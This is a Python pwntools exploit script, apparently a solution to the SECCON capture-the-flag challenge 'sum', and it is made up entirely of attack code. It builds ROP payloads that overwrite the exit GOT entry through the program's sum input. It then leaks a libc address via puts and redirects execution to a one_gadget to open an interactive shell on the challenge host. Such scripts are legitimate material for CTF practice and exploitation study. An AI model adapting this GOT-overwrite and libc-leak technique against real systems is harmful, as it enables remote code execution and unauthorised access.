#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./sum_ccafa40ee6a5a675341787636292bf3c84d17264')
else:
    s = remote('sum.chal.seccon.jp', 10001)

elf = ELF('./sum_ccafa40ee6a5a675341787636292bf3c84d17264')
libc = ELF('./libc.so_18292bd12d37bfaf58e8dded9db7f1f5da1192cb')

pop_rdi = 0x400a43
pop2 = 0x400a40
ret = 0x4005ee

payload = [
    pop_rdi,
    elf.got['alarm'],
    elf.symbols['puts'],
    elf.symbols['main'] + 1
]
payload.append(pop_rdi - sum(payload) - elf.got['exit'])
payload.append(elf.got['exit'])
s.sendlineafter('0\n', ' '.join(map(str, payload)))

libc_base = u64(s.recvline(False).ljust(8, '\0')) - libc.symbols['alarm']
log.info('libc base: %#x' % libc_base)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]

payload = [
    1,
    libc_base + one_gadgets[1],
    1,
    1,
]
payload.append(pop2 - sum(payload) - elf.got['exit'])
payload.append(elf.got['exit'])
s.sendlineafter('0\n', ' '.join(map(str, payload)))

s.interactive()
